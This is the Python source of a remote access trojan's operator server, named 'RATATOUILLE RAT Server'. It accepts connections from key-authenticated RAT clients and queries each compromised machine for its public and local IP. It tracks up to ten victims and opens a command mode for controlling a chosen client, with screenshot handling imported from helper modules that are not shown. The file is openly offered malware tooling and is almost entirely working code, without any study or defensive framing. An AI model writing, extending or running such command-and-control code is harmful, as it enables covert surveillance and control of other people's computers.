import socket
import sys
import threading
import argparse
import time
import json
import os
import colorama  # type: ignore
from colorama import Fore, Style, Back  # type: ignore
from modules.rat_server_utils import (
    clear_screen,
    handle_client_disconnect,
    receive_screenshot,
    show_client_commands
)
from modules.client_handler import client_command_mode as client_handler_command_mode, handle_client_disconnect_wrapper
from modules.server_command_processor import process_command, process_menu_choice
from modules.client_manager import list_clients
from modules.server_formatings import show_loading_animation, show_server_restart_animation
from modules.server_ui_utils import print_banner, print_prompt, show_main_menu, show_options_panel

# Initialize colorama
colorama.init(autoreset=True)

# Global authentication key - will be set by user
AUTH_KEY = None

def set_auth_key(key):
    """Set the global authentication key"""
    global AUTH_KEY
    AUTH_KEY = key

def get_auth_key():
    """Get the current authentication key"""
    return AUTH_KEY

def parse_arguments():
    """Parse command line arguments for server configuration"""
    parser = argparse.ArgumentParser(description='RATATOUILLE RAT Server')
    parser.add_argument('-i', '--ip', default='0.0.0.0', 
                        help='IP address to bind to (default: 0.0.0.0)')
    parser.add_argument('-p', '--port', type=int, default=8888,
                        help='Port to listen on (default: 8888)')
    parser.add_argument('-b', '--buffer', type=int, default=1024,
                        help='Buffer size (default: 1024)')
    parser.add_argument('-m', '--max-clients', type=int, default=10,
                        help='Maximum number of clients (default: 10)')
    return parser.parse_args()

def show_startup_animation():
    """Display a startup animation when the script is launched"""
    clear_screen()
    print("\n\n")
    
    # Use the banner from server_ui_utils.py
    print_banner(center=False)
    
    print("\n")
    
    # Initialize components with loading animation
    components = [
        "Initializing network components",
        "Loading command modules",
        "Setting up client handlers",
        "Configuring security protocols",
        "Preparing user interface"
    ]
    
    for component in components:
        # Show loading animation for each component
        loading_thread = threading.Thread(target=show_loading_animation, args=(component, 1))
        loading_thread.daemon = True
        loading_thread.start()
        loading_thread.join()
        print(f"{Fore.GREEN}✓ {component} complete{Style.RESET_ALL}")
    
    print("\n")
    print(f"{Fore.CYAN}RATATOUILLE Server initialized successfully!{Style.RESET_ALL}")
    time.sleep(1)
    clear_screen()

def show_shutdown_animation():
    """Display a shutdown animation when exiting the program"""
    clear_screen()
    print("\n\n")
    
    # Use the banner from server_ui_utils.py with a different color
    print_banner(center=True)
    
    print("\n")
    print(f"{Fore.YELLOW}Shutting down RATATOUILLE server...{Style.RESET_ALL}")
    print("\n")
    
    # Shutdown components with loading animation
    components = [
        "Closing client connections",
        "Stopping network services",
        "Unloading command modules",
        "Releasing system resources",
        "Finalizing shutdown sequence"
    ]
    
    for component in components:
        # Show loading animation for each component
        loading_thread = threading.Thread(target=show_loading_animation, args=(component, 0.8))
        loading_thread.daemon = True
        loading_thread.start()
        loading_thread.join()
        print(f"{Fore.RED}✓ {component} complete{Style.RESET_ALL}")
    
    print("\n")
    print(f"{Fore.CYAN}RATATOUILLE Server shutdown complete. Goodbye!{Style.RESET_ALL}")
    time.sleep(1.5)

# Configuration (will be overridden by command line arguments if provided)
args = parse_arguments()
PORT = args.port
HOST = args.ip
BUFFER_SIZE = args.buffer
MAX_CLIENTS = args.max_clients

# Global variables
client_sockets = [None] * MAX_CLIENTS
client_info = [None] * MAX_CLIENTS  # Store client information including public IP
active_client = -1
running = True
server_running = False
server_socket = None
accept_thread = None
monitor_thread = None
toast_lock = threading.Lock()
toast_active = False

def get_terminal_size():
    """Get the current terminal size"""
    # Return fixed values instead of detecting terminal size
    return 80, 24

def responsive_ui(content, padding=2, min_width=40):
    """Format content without responsive adjustments"""
    # Simply return the content without any responsive formatting
    return content

def center_text(text):
    """Return text without centering"""
    # Return text as is without centering
    return text

def handle_client_disconnect_wrapper_local(client_id):
    """Wrapper for handle_client_disconnect to be used locally"""
    global active_client, client_sockets, client_info
    new_active_client = handle_client_disconnect(client_id, client_sockets, active_client)
    if new_active_client is not None:
        active_client = new_active_client
    
    # Clear client info when disconnecting
    if 0 <= client_id < len(client_info):
        client_info[client_id] = None
    
    return active_client

def start_server():
    """Start the RAT server"""
    global server_running, server_socket, accept_thread, monitor_thread, HOST, PORT

    if server_running:
        print(f"{Fore.YELLOW}⚠ Server is already running{Style.RESET_ALL}")
        return

    # Create a socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    print(f"\n{Fore.CYAN}◉ Initializing server on {Fore.WHITE}{HOST}{Fore.CYAN}:{Fore.WHITE}{PORT}{Style.RESET_ALL}")
    
    try:
        # Use the current HOST and PORT values
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        server_running = True
        
        print(f"{Fore.GREEN}✓ RAT Server activated successfully!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}◉ Listening for connections on {Fore.WHITE}{HOST}{Fore.CYAN}:{Fore.WHITE}{PORT}{Style.RESET_ALL}")

        # Start a thread to accept connections
        accept_thread = threading.Thread(target=accept_connections, args=(server_socket,))
        accept_thread.daemon = True
        accept_thread.start()

        # Start monitor thread
        monitor_thread = threading.Thread(target=monitor_clients)
        monitor_thread.daemon = True
        monitor_thread.start()

    except socket.error as e:
        print(f"{Fore.RED}✗ Error starting server: {e}{Style.RESET_ALL}")
        server_socket = None
        # Add more detailed error handling for common issues
        if "Address already in use" in str(e):
            print(f"{Fore.YELLOW}⚠ Port {PORT} is already in use. Try changing the port in Server Options.{Style.RESET_ALL}")
        elif "Cannot assign requested address" in str(e):
            print(f"{Fore.YELLOW}⚠ Cannot bind to address {HOST}. Try using 0.0.0.0 to listen on all interfaces.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}  If you're trying to use a specific IP, make sure it's assigned to your computer.{Style.RESET_ALL}")
        elif "Permission denied" in str(e):
            print(f"{Fore.YELLOW}⚠ Permission denied. Ports below 1024 require administrator privileges.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}⚠ Detailed error: {str(e)}{Style.RESET_ALL}")

def stop_server():
    """Stop the RAT server without exiting the program"""
    global server_running, server_socket, client_sockets, accept_thread, monitor_thread

    if not server_running:
        print(f"{Fore.YELLOW}⚠ Server is not running.{Style.RESET_ALL}")
        return
    
    # Add a newline for spacing
    print("")

    # Close all client connections
    for i in range(MAX_CLIENTS):
        if client_sockets[i]:
            try:
                client_sockets[i].close()
            except:
                pass
            client_sockets[i] = None
            client_info[i] = None  # Clear client info as well

    # Close server socket
    if server_socket:
        try:
            server_socket.close()
        except:
            pass
        server_socket = None

    # Reset threads
    accept_thread = None
    monitor_thread = None
    
    server_running = False
    
    print(f"{Fore.GREEN}✓ Server stopped successfully{Style.RESET_ALL}")

def accept_connections(server_socket):
    """Accept new client connections"""
    global running, server_running

    while running and server_running:
        try:
            client, addr = server_socket.accept()

            # Validate this is actually our RAT client before accepting
            try:
                client.settimeout(5.0)  # 5 second timeout for validation
                client.send("validate_client".encode())
                validation_response = client.recv(1024).decode('utf-8', errors='replace')
                client.settimeout(None)  # Reset timeout
                
                # Check if this is our RAT client and validate authentication key
                if "RAT_CLIENT_VALIDATED" not in validation_response:
                    print(f"❌ Invalid client connection from {addr[0]}:{addr[1]} - not our RAT client")
                    client.close()
                    continue
                
                # Extract and validate authentication key
                if ":" in validation_response:
                    client_key = validation_response.split(":", 1)[1]
                    current_auth_key = get_auth_key()
                    if current_auth_key is None:
                        print(f"❌ Server authentication key not set! Use 'Set Auth Key' option first.")
                        client.close()
                        continue
                    elif client_key != current_auth_key:
                        print(f"❌ Authentication failed from {addr[0]}:{addr[1]} - invalid key: '{client_key}'")
                        client.close()
                        continue
                    else:
                        print(f"✅ Client authenticated successfully from {addr[0]}:{addr[1]} with key: '{client_key}'")
                else:
                    print(f"❌ No authentication key provided by client from {addr[0]}:{addr[1]}")
                    client.close()
                    continue
            except Exception as e:
                print(f"❌ Failed to validate client from {addr[0]}:{addr[1]} - {str(e)}")
                client.close()
                continue
            
            # Find an empty slot for the validated client
            for i in range(MAX_CLIENTS):
                if client_sockets[i] is None:
                    client_sockets[i] = client
                    
                    # Store client information immediately with connection IP
                    client_info[i] = {
                        'public_ip': addr[0],  # Will be updated later
                        'local_ip': addr[0],   # Will be updated later
                        'connection_ip': addr[0],
                        'port': addr[1],
                        'connected_at': time.time(),
                        'ip_detection_status': 'pending'  # Track detection status
                    }
                    
                    # Show immediate connection notification
                    notification = f"New client {i}: {addr[0]} (Detecting public IP...)"
                    show_toast_notification(notification, 1, position="bottom-right")
                    
                    # Start background IP detection after connection is established
                    def detect_public_ip_background(client_socket, client_id, client_addr):
                        time.sleep(2)  # Wait 2 seconds for connection to stabilize
                        try:
                            # Send IP detection command
                            client_socket.send("get_public_ip_info".encode())
                            client_socket.settimeout(8.0)  # 8 second timeout
                            response = client_socket.recv(1024).decode('utf-8', errors='replace')
                            client_socket.settimeout(None)  # Reset timeout
                            
                            if response and "Public IP:" in response:
                                lines = response.split('\n')
                                public_ip = "Unknown"
                                local_ip = client_addr[0]
                                
                                for line in lines:
                                    if "Public IP:" in line:
                                        public_ip = line.split(': ')[-1].strip()
                                    elif "Local IP:" in line:
                                        local_ip = line.split(': ')[-1].strip()
                                
                                # Update client info with detected IPs
                                if client_info[client_id] is not None:
                                    client_info[client_id]['public_ip'] = public_ip
                                    client_info[client_id]['local_ip'] = local_ip
                                    client_info[client_id]['ip_detection_status'] = 'completed'
                                    
                                    # Show success notification
                                    success_notification = f"Client {client_id}: {public_ip} (Public IP detected!)"
                                    show_toast_notification(success_notification, 2, position="bottom-right")
                            else:
                                # Mark as failed but keep connection
                                if client_info[client_id] is not None:
                                    client_info[client_id]['ip_detection_status'] = 'failed'
                        except Exception as e:
                            # Mark as failed but keep connection
                            print(f"⚠️  IP detection failed for client {client_id}: {str(e)}")
                            if client_info[client_id] is not None:
                                client_info[client_id]['ip_detection_status'] = 'failed'
                    
                    # Start the background IP detection thread
                    ip_detection_thread = threading.Thread(
                        target=detect_public_ip_background, 
                        args=(client, i, addr)
                    )
                    ip_detection_thread.daemon = True
                    ip_detection_thread.start()
                    
                    # Initial notification already shown above
                    break
            else:
                # If no empty slot, reject the connection
                client.close()
        except:
            if not running or not server_running:
                break

def monitor_clients():
    """Monitor clients and handle disconnections"""
    global running, server_running

    while running and server_running:
        for i in range(MAX_CLIENTS):
            if client_sockets[i]:
                try:
                    # Check if client is still connected by sending empty data
                    client_sockets[i].send(b'')
                except:
                    print(f"\nClient {i} disconnected unexpectedly")
                    handle_client_disconnect_wrapper_local(i)

        # Check every 5 seconds
        time.sleep(5)

def show_options_panel_wrapper():
    """Wrapper for show_options_panel to handle global variables"""
    global PORT, HOST, BUFFER_SIZE, MAX_CLIENTS, client_sockets, server_running
    
    # Store original values to check if they changed
    original_host = HOST
    original_port = PORT
    
    # Call the options panel function with the updated signature
    PORT, HOST, BUFFER_SIZE, MAX_CLIENTS, restart_needed = show_options_panel(
        PORT, HOST, BUFFER_SIZE, MAX_CLIENTS, client_sockets, handle_client_disconnect_wrapper_local
    )
    
    # Save the new configuration to a config file for persistence
    save_configuration()
    
    # Check if we need to restart the server
    if restart_needed:
        print("\n" + "─" * 60)
        print(f"{Fore.CYAN}【 SERVER CONFIGURATION UPDATE 】{Style.RESET_ALL}")
        print("─" * 60)
        print(f"{Fore.WHITE}New Configuration: {Fore.GREEN}{HOST}{Fore.WHITE}:{Fore.GREEN}{PORT}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Buffer Size: {Fore.GREEN}{BUFFER_SIZE}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Max Clients: {Fore.GREEN}{MAX_CLIENTS}{Style.RESET_ALL}")
        print("─" * 60 + "\n")
        
        # Restart the server if it was running
        if server_running:
            print(f"{Fore.YELLOW}⚙ Initiating server restart sequence...{Style.RESET_ALL}")
            time.sleep(0.5)
            
            # Stop the server
            stop_server()
            
            # Show the restart animation
            show_server_restart_animation(HOST, PORT)
            
            # Start the server with new configuration
            start_server()
            
            print(f"\n{Fore.GREEN}✓ Server restart completed successfully!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Now listening on {Fore.WHITE}{HOST}{Fore.CYAN}:{Fore.WHITE}{PORT}{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.YELLOW}⚠ Server was not running.{Style.RESET_ALL}")
            print(f"{Fore.CYAN}ℹ Changes will apply next time you start the server.{Style.RESET_ALL}\n")
        
        time.sleep(2)  # Give user time to read the message

def save_configuration():
    """Save current configuration to a config file"""
    try:
        config = {
            "host": HOST,
            "port": PORT,
            "buffer_size": BUFFER_SIZE,
            "max_clients": MAX_CLIENTS
        }
        
        with open("server_config.json", "w") as f:
            json.dump(config, f, indent=4)
            
        print(f"{Fore.GREEN}Configuration saved to server_config.json{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error saving configuration: {e}{Style.RESET_ALL}")

def load_configuration():
    """Load configuration from config file if it exists"""
    global HOST, PORT, BUFFER_SIZE, MAX_CLIENTS
    
    try:
        if os.path.exists("server_config.json"):
            with open("server_config.json", "r") as f:
                config = json.load(f)
                
            # Update global variables with loaded configuration
            HOST = config.get("host", HOST)
            PORT = config.get("port", PORT)
            BUFFER_SIZE = config.get("buffer_size", BUFFER_SIZE)
            MAX_CLIENTS = config.get("max_clients", MAX_CLIENTS)
            
            print(f"{Fore.GREEN}Configuration loaded from server_config.json{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error loading configuration: {e}{Style.RESET_ALL}")

def client_command_mode():
    """Enter client command mode for the active client"""
    global active_client

    if active_client < 0 or not server_running:
        print(f"{Fore.RED}No client selected or server not running{Style.RESET_ALL}")
        return

    clear_screen()

    # Call print_banner without centering
    print_banner(center=False)

    print(f"{Fore.CYAN}=== CLIENT COMMAND MODE - Client {active_client} ==={Style.RESET_ALL}")

    # Add vertical spacing (1 line)
    print("")

    # Print instructions with no padding (left-aligned)
    print(f"{Fore.YELLOW}Type 'back' to return to main menu or 'exit' to disconnect client{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Type 'help' to see available commands{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}=== OUTPUT ==={Style.RESET_ALL}")

    # Add vertical spacing (1 line)
    print("")

    while active_client >= 0 and server_running:
        try:
            # Use gradient colors for the client prompt (red -> white -> light blue) with bold and larger text
            # Bold is \033[1m, we'll use this with colorama colors
            sys.stdout.write(f"{gradient_text(f'Client {active_client}> ')}")
            sys.stdout.flush()
            command = input()

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Returning to main menu...{Style.RESET_ALL}")
            break

def show_toast_notification(message, duration=3, position="top-right"):
    """Show a toast notification at the specified position"""
    global toast_active

    def toast_thread():
        global toast_active
        with toast_lock:
            toast_active = True

            # Save cursor position
            sys.stdout.write("\033[s")

            # Get terminal size for positioning
            term_width, term_height = get_terminal_size()

            # Adapt message length if terminal is narrow
            display_message = message
            if term_width < 60:
                # For narrow terminals, truncate or reformat the message
                if ":" in message:
                    # Split IP and port to separate lines for client notifications
                    parts = message.split(":")
                    if len(parts) >= 2:
                        client_part = parts[0]
                        port_part = parts[1]
                        display_message = f"{client_part}\n:{port_part}"
                else:
                    # For other messages, truncate if needed
                    max_length = max(20, term_width - 10)
                    if len(message) > max_length:
                        display_message = message[:max_length-3] + "..."

            # Calculate position based on parameter
            first_line = display_message.split('\n')[0]
            if position == "top-right":
                # Position at top-right corner
                sys.stdout.write("\033[0;" + str(max(0, term_width-len(first_line)-4)) + "H")
            elif position == "bottom-right":
                # Position at bottom-right corner
                sys.stdout.write("\033[" + str(term_height-2) + ";" + str(max(0, term_width-len(first_line)-4)) + "H")
            elif position == "top-left":
                # Position at top-left corner
                sys.stdout.write("\033[0;0H")
            elif position == "bottom-left":
                # Position at bottom-left corner
                sys.stdout.write("\033[" + str(term_height-2) + ";0H")
            else:
                # Default to top-right
                sys.stdout.write("\033[0;" + str(max(0, term_width-len(first_line)-4)) + "H")

            # Display notification with background
            if "\n" in display_message:
                # Handle multi-line messages
                lines = display_message.split("\n")
                for i, line in enumerate(lines):
                    if i > 0:
                        # Move cursor to next line at same horizontal position
                        if position.endswith("-right"):
                            sys.stdout.write("\033[" + str(1 if i == 1 else 1) + ";" + str(max(0, term_width-len(line)-4)) + "H")
                        else:
                            sys.stdout.write("\033[" + str(1 if i == 1 else 1) + ";0H")
                    sys.stdout.write(f"{Fore.BLACK}{Style.BRIGHT}{Back.WHITE} {line} {Style.RESET_ALL}")
                    sys.stdout.flush()
            else:
                sys.stdout.write(f"{Fore.BLACK}{Style.BRIGHT}{Back.WHITE} {display_message} {Style.RESET_ALL}")
                sys.stdout.flush()

            # Wait for duration
            time.sleep(duration)

            # Clear the notification (overwrite with spaces)
            if "\n" in display_message:
                lines = display_message.split("\n")
                for i, line in enumerate(lines):
                    if position.endswith("-right"):
                        sys.stdout.write("\033[" + str(i) + ";" + str(max(0, term_width-len(line)-4)) + "H")
                    else:
                        sys.stdout.write("\033[" + str(i) + ";0H")
                    sys.stdout.write(" " * (len(line) + 2))
            else:
                if position == "top-right":
                    sys.stdout.write("\033[0;" + str(max(0, term_width-len(display_message)-4)) + "H")
                elif position == "bottom-right":
                    sys.stdout.write("\033[" + str(term_height-2) + ";" + str(max(0, term_width-len(display_message)-4)) + "H")
                elif position == "top-left":
                    sys.stdout.write("\033[0;0H")
                elif position == "bottom-left":
                    sys.stdout.write("\033[" + str(term_height-2) + ";0H")
                else:
                    sys.stdout.write("\033[0;" + str(max(0, term_width-len(display_message)-4)) + "H")

                sys.stdout.write(" " * (len(display_message) + 2))

            # Restore cursor position
            sys.stdout.write("\033[u")
            sys.stdout.flush()

            toast_active = False

    # Start toast in a separate thread
    t = threading.Thread(target=toast_thread)
    t.daemon = True
    t.start()

def gradient_text(text, bold=True):
    """Create text with a gradient from RED to LIGHT RED to WHITE to LIGHT CYAN to LIGHT BLUE to BLUE"""
    colors = [Fore.RED, Fore.LIGHTRED_EX, Fore.WHITE, Fore.LIGHTCYAN_EX, Fore.LIGHTBLUE_EX, Fore.BLUE]
    result = ""

    # Calculate how many characters per color
    chars_per_color = max(1, len(text) // len(colors))

    # Apply colors to text
    for i, char in enumerate(text):
        color_index = min(i // chars_per_color, len(colors) - 1)
        if bold:
            result += f"\033[1m{colors[color_index]}{char}"
        else:
            result += f"{colors[color_index]}{char}"

    return result + Style.RESET_ALL

def main():
    """Main function to run the RAT server"""
    global running, active_client
    
    # Display current configuration
    print(" ")
    # Display server configuration in a styled box
    print(f"\n{Fore.CYAN}╔{'═' * 50}═╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{' ' * 51}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}{'SERVER CONFIGURATION'.center(50)}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{' ' * 51}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.WHITE}IP Address:{' ' * 5}{Fore.GREEN}{HOST}{' ' * (33 - len(HOST))}{Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.WHITE}Port:{' ' * 11}{Fore.GREEN}{PORT}{' ' * (33 - len(str(PORT)))}{Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.WHITE}Buffer Size:{' ' * 4}{Fore.GREEN}{BUFFER_SIZE}{' ' * (33 - len(str(BUFFER_SIZE)))}{Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}  {Fore.WHITE}Max Clients:{' ' * 4}{Fore.GREEN}{MAX_CLIENTS}{' ' * (33 - len(str(MAX_CLIENTS)))}{Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{' ' * 51}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╠{'═' * 51}╣{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}{Fore.GREEN}{Style.BRIGHT}{'RATATOUILLE SERVER INITIALIZED SUCCESSFULLY!'.center(50)}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚{'═' * 51}╝{Style.RESET_ALL}")
    time.sleep(5)  # Increased from 1 to 5 seconds
    clear_screen()

    # Main menu loop
    while running:
        try:
            show_main_menu(server_running, HOST, PORT, client_sockets, MAX_CLIENTS)

            # Use gradient colors for the prompt with bold text
            # Don't add a newline at the end to keep input on same line
            sys.stdout.write(f"\n{gradient_text('ENTER OPTION: ')}")
            sys.stdout.flush()
            choice = input()

            # Call the imported process_menu_choice with all required parameters
            continue_running, new_active_client = process_menu_choice(
                choice, lambda: show_main_menu(server_running, HOST, PORT, client_sockets, MAX_CLIENTS),
                start_server, stop_server, server_running, list_clients, client_sockets,
                active_client, client_handler_command_mode, show_options_panel_wrapper,
                show_client_commands, running, client_info
            )

            active_client = new_active_client

            # If a client was selected, enter client command mode
            if active_client >= 0 and choice == "4":
                # Call the imported client_command_mode with necessary parameters
                active_client = client_handler_command_mode(active_client, client_sockets, server_running, print_banner, BUFFER_SIZE)

            if not continue_running:
                # Show shutdown animation before exiting
                if server_running:
                    stop_server()
                show_shutdown_animation()
                break

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Exiting program...{Style.RESET_ALL}")
            if server_running:
                stop_server()
            show_shutdown_animation()
            running = False
            break
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

# Call the main function when the script is executed
if __name__ == "__main__":
    # Parse command line arguments first
    args = parse_arguments()
    
    # Then load saved configuration
    load_configuration()
    
    # Override with command line arguments if provided
    if args.ip != '0.0.0.0':  # Only override if explicitly provided
        HOST = args.ip
    if args.port != 8888:  # Only override if explicitly provided
        PORT = args.port
    if args.buffer != 1024:  # Only override if explicitly provided
        BUFFER_SIZE = args.buffer
    if args.max_clients != 10:  # Only override if explicitly provided
        MAX_CLIENTS = args.max_clients
    
    show_startup_animation()
    main()    

























